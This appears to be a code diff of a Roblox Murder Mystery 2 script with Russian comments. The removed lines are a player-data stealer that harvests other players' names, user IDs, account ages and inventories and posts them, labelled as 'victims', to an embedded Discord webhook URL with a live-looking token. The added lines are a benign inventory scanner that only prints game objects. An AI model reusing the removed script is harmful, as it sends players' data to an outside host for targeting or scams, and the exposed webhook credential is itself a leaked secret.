@@ -1,89 +1,42 @@
--- 100% МЕТОД ТИПОВ ДЛЯ ALPHA (Nersadme)
--- Zo спиздил их ядро
+-- Сканер хранилища MM2
+-- Найдёт, где лежит инвентарь
 
-local webhook = "https://discord.com/api/webhooks/1534478195519393974/T6RAtnjzdd0OE_6m1EZD6OjCx4x-npU2bBLP73mvHRmeZRBmmviciIx-6S5JEEsHmv37"
-local alphaNick = "Nersadme"
-
-local Players = game:GetService("Players")
-local RS = game:GetService("ReplicatedStorage")
-local HttpService = game:GetService("HttpService")
-
--- Функция отправки (точь-в-точь как у типов)
-local function sendToWebhook(msg, fields)
-    local data = {
-        content = msg,
-        embeds = {{
-            title = "Жертва в MM2",
-            fields = fields or {}
-        }}
-    }
-    
-    pcall(function()
-        HttpService:PostAsync(webhook, HttpService:JSONEncode(data))
-    end)
+print("=== СКАНИРУЕМ REPLICATED STORAGE ===")
+for _, v in pairs(game:GetService("ReplicatedStorage"):GetChildren()) do
+    print(v.Name, v.ClassName)
+    -- Если это папка или модуль, заглядываем внутрь
+    if v:IsA("Folder") or v:IsA("ModuleScript") or v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
+        print("  -> Содержимое " .. v.Name .. ":")
+        pcall(function()
+            for _, child in pairs(v:GetChildren()) do
+                print("      " .. child.Name, child.ClassName)
+            end
+        end)
+    end
 end
 
--- Сбор инфы (их метод)
-local function stealInfo(player)
-    local fields = {
-        {name = "Ник", value = player.Name},
-        {name = "DisplayName", value = player.DisplayName},
-        {name = "UserID", value = tostring(player.UserId)},
-        {name = "Возраст акка", value = tostring(player.AccountAge) .. " дней"}
-    }
-    
-    -- Пытаемся найти инвентарь по их логике
-    local inventoryText = "Не найден"
-    
-    -- Ищем хранилище данных в ReplicatedStorage
-    local dataFolder = RS:FindFirstChild("Inventory") or RS:FindFirstChild("PlayerData") or RS:FindFirstChild("MurderData")
-    
-    if dataFolder then
-        local playerData = dataFolder:FindFirstChild(tostring(player.UserId))
-        if playerData then
-            local items = {}
-            for _, item in pairs(playerData:GetChildren()) do
-                table.insert(items, item.Name)
+print("=== СКАНИРУЕМ PLAYER ===")
+local me = game:GetService("Players").LocalPlayer
+for _, v in pairs(me:GetChildren()) do
+    print(v.Name, v.ClassName)
+    if v:IsA("Folder") or v:IsA("ModuleScript") then
+        print("  -> Содержимое " .. v.Name .. ":")
+        pcall(function()
+            for _, child in pairs(v:GetChildren()) do
+                print("      " .. child.Name, child.ClassName)
             end
-            if #items > 0 then
-                inventoryText = table.concat(items, ", ")
+        end)
+    end
+end
+
+print("=== СКАНИРУЕМ PLAYER GUI ===")
+pcall(function()
+    local gui = me:FindFirstChild("PlayerGui")
+    if gui then
+        for _, v in pairs(gui:GetDescendants()) do
+            if v:IsA("TextLabel") and string.find(v.Text, "Knife") or string.find(v.Text, "Gun") or string.find(v.Text, "Skin") or string.find(v.Text, "Item") then
+                print("  Найдено в GUI: " .. v.Text)
             end
         end
-    end
-    
-    -- Если в RS нет, проверяем Player
-    if inventoryText == "Не найден" then
-        local invFolder = player:FindFirstChild("Inventory") or player:FindFirstChild("MM2_Inventory")
-        if invFolder then
-            local items = {}
-            for _, item in pairs(invFolder:GetChildren()) do
-                table.insert(items, item.Name)
-            end
-            if #items > 0 then
-                inventoryText = table.concat(items, ", ")
-            end
-        end
-    end
-    
-    table.insert(fields, {name = "Инвентарь", value = inventoryText})
-    
-    sendToWebhook("Новая жертва на сервере, Alpha!", fields)
-end
-
--- Проверяем всех игроков
-for _, player in pairs(Players:GetPlayers()) do
-    if player.Name ~= alphaNick then
-        stealInfo(player)
-    end
-end
-
--- Новые игроки
-Players.PlayerAdded:Connect(function(player)
-    if player.Name ~= alphaNick then
-        task.wait(1)
-        stealInfo(player)
     end
 end)
-
--- Тестовое сообщение
-sendToWebhook("Скрипт с логикой типов запущен, Alpha! ✅", {})
